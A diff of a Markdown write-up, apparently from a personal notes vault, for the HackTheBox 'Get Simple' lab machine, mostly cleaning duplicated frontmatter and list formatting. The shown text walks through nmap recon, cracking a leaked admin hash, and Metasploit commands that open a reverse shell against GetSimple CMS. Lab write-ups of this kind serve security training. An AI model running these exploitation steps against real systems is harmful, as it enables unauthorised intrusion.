@@ -12,49 +12,15 @@ tags:
   - rce
   - sudo
   - upload-bypass
-synced: "2026-11-02 09:58"
+synced: "2026-11-02 12:08"
 ---
-
---
-title: "Get Simple - Hack The Box"
-target: "Get Simple"
-os: "Linux"
-difficulty: "Easy"
-status: "Pwned"
-vectors: "GetSimple CMS 3.3.16 Theme Upload RCE, Sudo Binary Execution Abuse"
-tags:
-ciber
-htb
-getsimple-cms
-rce
-sudo
-upload-bypass
-synced: "2026-11-02 09:56"
---
-
--
-title: "Get Simple - Hack The Box"
-target: "Get Simple"
-os: "Linux"
-difficulty: "Easy"
-status: "Pwned"
-vectors: "GetSimple CMS 3.3.16 Theme Upload RCE, Sudo Binary Execution Abuse"
-tags:
-ciber
-htb
-getsimple-cms
-rce
-sudo
-upload-bypass
-synced: "2026-11-02 09:43"
--
 
 This write-up covers the exploitation of the **Get Simple** machine from HackTheBox. The attack path starts with extracting hashed credentials from an exposed XML file, exploiting a known Remote Code Execution (RCE) in GetSimple CMS to gain an initial shell, and subsequently abusing a `sudo` misconfiguration to achieve root access.
 
 ## Overview
 
-*IP Address:** 10.129.42.249
-*CMS:** GetSimple CMS 3.3.15
+- **IP Address:** 10.129.42.249
+- **CMS:** GetSimple CMS 3.3.15
 
 ## Reconnaissance
 
@@ -67,16 +33,16 @@ nmap -sV --script=http-enum 10.129.42.249
 ```
 
 The scan reveals two open ports:
-*22/tcp (SSH):** OpenSSH 8.2p1 (Ubuntu)
-*80/tcp (HTTP):** Apache httpd 2.4.41 (Ubuntu)
+- **22/tcp (SSH):** OpenSSH 8.2p1 (Ubuntu)
+- **80/tcp (HTTP):** Apache httpd 2.4.41 (Ubuntu)
 
 ### Web Enumeration
 
 The `http-enum` script identifies several interesting directories on the web server:
-`/admin/`
-`/backups/`
-`/robots.txt`
-`/data/`
+- `/admin/`
+- `/backups/`
+- `/robots.txt`
+- `/data/`
 
 Checking `/robots.txt`, we confirm that the `/admin/` path is explicitly disallowed for crawlers. 
 
@@ -102,7 +68,7 @@ Further inspection of the `/data/` directory reveals that directory listing is e
 The `admin.xml` file leaks a SHA-1 hashed password for the `admin` user: `d033e22ae348aeb5660fc2140aec35850c4da997`. 
 Using open-source hash cracking services (such as CrackStation), we successfully reverse the hash to its plaintext equivalent: `admin`.
 
-Credentials Compromised:** `admin:admin`
+**Credentials Compromised:** `admin:admin`
 
 ### Exploitation (GetSimple CMS 3.3.15)
 
@@ -120,7 +86,7 @@ msf exploit(...) > set targeturi /
 msf exploit(...) > set payload generic/shell_reverse_tcp
 msf exploit(...) > exploit
 ```
-(Note: An initial attempt targeting `/admin` failed. Adjusting the `targeturi` to the root directory `/` yielded a successful connection.)*
+*(Note: An initial attempt targeting `/admin` failed. Adjusting the `targeturi` to the root directory `/` yielded a successful connection.)*
 
 The exploit executes successfully, and we receive a reverse shell as the `www-data` user. We immediately upgrade the shell to a fully interactive pseudo-TTY using Python.
 
